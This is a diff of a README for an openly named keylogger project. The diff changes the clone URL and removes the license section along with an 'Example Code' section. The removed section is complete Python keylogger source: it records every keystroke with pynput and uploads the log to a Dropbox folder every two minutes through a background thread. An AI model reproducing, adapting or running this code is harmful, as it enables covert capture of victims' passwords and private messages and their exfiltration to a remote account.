@@ -36,7 +36,7 @@ To upload files to Dropbox, you need an access token:
 1. **Clone the Repository**:
 
 ```sh
-git clone https://github.com/yourusername/keylogger-dropbox.git
+git clone https://github.com/drewmayberry11/KeyLogger.git
 cd keylogger-dropbox
 ```
 
@@ -52,58 +52,6 @@ cd keylogger-dropbox
 python keylogger.py
 ```
 
-## Example Code
-
-```python
-import dropbox
-from pynput import keyboard
-import threading
-import time
-
-# Hardcoded configuration
-DROPBOX_ACCESS_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN'  # Replace with your actual Dropbox access token
-LOG_FILE_PATH = 'keyLogger.txt'  # Replace with the desired log file path
-
-# Initialize Dropbox client
-dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
-
-def upload_log():
-    with open(LOG_FILE_PATH, 'rb') as f:
-        dbx.files_upload(f.read(), '/APP/FOLDER/keyLogger.txt', mode=dropbox.files.WriteMode.overwrite)
-    print("Log uploaded to Dropbox")
-
-def schedule_upload(interval):
-    while True:
-        time.sleep(interval)
-        upload_log()
-
-def on_press(key):
-    try:
-        log = key.char
-    except AttributeError:
-        if key == keyboard.Key.space:
-            log = ' '
-        elif key == keyboard.Key.enter:
-            log = 'ENTER '
-        elif key == keyboard.Key.shift:
-            log = 'SHIFT '
-        elif key == keyboard.Key.shift_r:
-            log = 'SHIFT_R '
-        elif key == keyboard.Key.backspace:
-            log = 'BACKSPACE '
-        else:
-            log = f'{key} '
-    with open(LOG_FILE_PATH, 'a') as f:
-        f.write(log)
-
-if __name__ == "__main__":
-    upload_thread = threading.Thread(target=schedule_upload, args=(120,))
-    upload_thread.daemon = True
-    upload_thread.start()
-
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
-```
 
 ## Important Notes
 
@@ -114,6 +62,3 @@ if __name__ == "__main__":
 
 If you'd like to contribute, please fork the repository and use a feature branch. Pull requests are warmly welcome.
 
-## License
-
-This project is licensed under the MIT License. See the LICENSE file for details.
